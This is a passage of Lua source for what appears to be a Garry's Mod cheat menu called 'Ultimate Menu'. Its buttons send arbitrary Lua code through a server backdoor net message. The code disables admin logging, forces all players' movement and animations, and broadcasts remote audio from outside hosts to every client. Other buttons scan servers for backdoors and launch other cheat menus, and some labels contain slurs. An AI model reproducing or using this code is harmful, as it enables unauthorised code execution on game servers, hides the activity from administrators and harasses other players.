chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "ULX LOGECHO 0" )
    SploitNotify("ULX LOGECHO 0")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"logecho\", \"0\")")
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 20, 430 )
Macro:SetText( "Danse" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(chocolat)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Danse" )
    SploitNotify("Danse")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end timer.Create("dance_loop",8.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end end )
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 20, 250 )
Macro:SetText( "+right" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(chocolat)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "+right" )
    SploitNotify("+right")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("+right")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 20, 280 )
Macro:SetText( "+duck" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(chocolat)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "+duck" )
    SploitNotify("+right")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("+duck")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 20, 310 )
Macro:SetText( "+back" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(chocolat)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "+back" )
    SploitNotify("+back")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("+back")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 20, 340 )
Macro:SetText( "+forward" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(chocolat)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "+back" )
    SploitNotify("+back")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("+forward")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 20, 370 )
Macro:SetText( "undo" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(chocolat)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "undo" )
    SploitNotify("undo")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("undo")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 20, 400 )
Macro:SetText( "Stop right/etc" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(chocolat)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Stop right/etc" )
    SploitNotify("Stop right/etc")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("-right")
end

for k,v in pairs(player.GetAll()) do
    v:ConCommand("-duck")
end

for k,v in pairs(player.GetAll()) do
    v:ConCommand("-back")
end

for k,v in pairs(player.GetAll()) do
    v:ConCommand("-forward")
end
]])
net.WriteBit (1)
net.SendToServer()
end
-----------------------------
--    OPEN EXPLOIT MENU    --
-----------------------------
-- DANS LE AUTRES
local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 40 )
		Macro:SetParent(Misc)
        Macro:SetText( "Exploit Menu" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Exploit Menu" )
    SploitNotify("Exploit MENU")
    surface.PlaySound("buttons/blip1.wav") 
RunConsoleCommand( "jesus_exploitmenu" ) -- What happens when you press the button
end

------------------------------
--    SCAN BACKDOOR ALL     --
------------------------------
--DANS LE CONTROLLER
local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 70 )
		Macro:SetParent(Misc)
        Macro:SetText( "Scan backdoor" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Scan backdoor en cours..." )
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end


local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 100 )
		Macro:SetParent(Misc)
        Macro:SetText( "Scan backdoor toutes les 10s" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Scan backdoor toutes les 10 secondes en cours..." )
	timer.Create( "bdcheck10s", 10, 0, function()
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end)
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 130 )
		Macro:SetParent(Misc)
        Macro:SetText( "Scan backdoor toutes les 30s" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Scan backdoor toutes les 30 secondes en cours..." )
	timer.Create( "bdcheck30s", 30, 0, function()
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end)
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 160 )
		Macro:SetParent(Misc)
        Macro:SetText( "SmegHack" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "SmegHack lancé" )
    SploitNotify("SmegHack")
    surface.PlaySound("buttons/blip1.wav") 
RunConsoleCommand( "SmegHack_Menu" ) -- What happens when you press the button
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 190 )
		Macro:SetParent(Misc)
        Macro:SetText( "LokiDevs" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "LokiDevs lancé" )
    SploitNotify("LokiDevs lancé")
    surface.PlaySound("buttons/blip1.wav") 
RunConsoleCommand( "LokiDevs_Menu" ) -- What happens when you press the button
end


------------------------------------------------------------------------------
----------------- SOUNDBOARD ET MUSIQUE
------------------------------------------------------------------------------

-- MUSIQUE 


local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Musique)
Macro:SetPos( 20, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Musique - Be Friend" )
Macro.Paint = function()
surface.SetDrawColor(asuna)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristofficiel.fr/gmod/upload/whcant.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Musique - Be Friend activé" )
    SploitNotify("Musique - Be Friend ")
    surface.PlaySound("buttons/blip1.wav") 
end


local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Musique)
Macro:SetPos( 20, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Musique - Salut c'est cool" )
Macro.Paint = function()
surface.SetDrawColor(asuna)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristofficiel.fr/gmod/upload/salutccool.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Musique - Salut c'est cool activé" )
    SploitNotify("Musique - Salut c'est cool ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Musique)
Macro:SetPos( 20, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Musique - Tenir ta main" )
Macro.Paint = function()
surface.SetDrawColor(asuna)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristofficiel.fr/gmod/upload/Gr%C3%A9goire.mp3\", \"mono\", function()end )]])")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Musique - Tenir ta main activé" )
    SploitNotify("Musique - Tenir ta main ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Musique)
Macro:SetPos( 20, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Musique - Wesh Alors [JUL]" )
Macro.Paint = function()
surface.SetDrawColor(asuna)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end

Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristofficiel.fr/gmod/upload/wesh.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Musique - Wesh Alors [JUL] activé" )
    SploitNotify("Musique - Jul WESH ALORS ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musique)
Macro:SetPos( 20, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Musique - MondotekAlive" )
Macro.Paint = function()
surface.SetDrawColor(asuna)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristofficiel.fr/gmod/upload/Mondotek%20-%20Alive%20(Ph%20Electro%20Remix).mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Musique - MondotekAlive activé" )
    SploitNotify("Musique - MondotekAlive ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musique)
Macro:SetPos( 20, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Musique - Un éléphant " )
Macro.Paint = function()
surface.SetDrawColor(asuna)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristofficiel.fr/gmod/upload/Un%20%C3%A9l%C3%A9phant%20qui%20se%20balan%C3%A7ait.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Musique - Un éléphant qui se balancait activé !" )
    SploitNotify("Musique - Un éléphant qui se balancait ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musique)
Macro:SetPos( 20, 210 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Musique - Chuis bo" )
Macro.Paint = function()
surface.SetDrawColor(asuna)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/chuis%20bo.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Musique - Chuis bo" )
    SploitNotify("Musique - Chuis bo ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musique)
Macro:SetPos( 20, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Musique - Pouet pouet" )
Macro.Paint = function()
surface.SetDrawColor(asuna)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/R%C3%A9mi%20-%20La%20Totomobile%20-%20clip%20officiel.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Musique - Pouet Pouet" )
    SploitNotify("Musique - Pouet pouet ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musique)
Macro:SetPos( 20, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Musique - Pirouette" )
Macro.Paint = function()
surface.SetDrawColor(asuna)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/Pirouette,%20cacahu%C3%A8te%20-%20Il%20%C3%A9tait%20un%20petit%20homme.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Musique - Pirouette" )
    SploitNotify("Musique - Pirouette ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musique)
Macro:SetPos( 20, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Musique - Pomme api" )
Macro.Paint = function()
surface.SetDrawColor(asuna)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/Pomme%20de%20reinette%20et%20pomme%20d'api.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Musique - Pomme api" )
    SploitNotify("Musique - Pomme api ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musique)
Macro:SetPos( 20, 330 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Musique - Gipsy" )
Macro.Paint = function()
surface.SetDrawColor(asuna)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/L'araign%C3%A9e%20Gipsy.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Musique - Gipsy" )
    SploitNotify("Musique - Gipsy ")
    surface.PlaySound("buttons/blip1.wav") 
end
----SOUNDBOARD


local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 200, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - Karim" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristofficiel.fr/gmod/upload/KARIM.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Musique - Karim activé" )
    SploitNotify("Musique - KARIM")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 200, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - AHHHHHH" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristofficiel.fr/gmod/upload/AHHHHHHHHHHHHHHHHH.wav\", \"mono\", function()end )]])") 
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard - AHHHHHH activé" )
    SploitNotify("Soundboard - AHHHHHH ")
    surface.PlaySound("buttons/blip1.wav") 
end


local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 200, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - Code avec le cul" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristofficiel.fr/gmod/upload/code.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard - Code avec le cul activé" )
    SploitNotify("Soundboard - JE CODE AVEC LE CUL ")
    surface.PlaySound("buttons/blip1.wav") 
end

----TK78
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 15, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - WALLAH" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Wallah.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 15, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - zehmah" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Zehma.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 15, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - mongole" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/bruit%20de%20gogole.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 15, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - mon reup" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/mon%20rep%20se%20pose%20des%20questions.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 15, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - musique 1" )
Macro.Paint = function()
surface.SetDrawColor(vert)
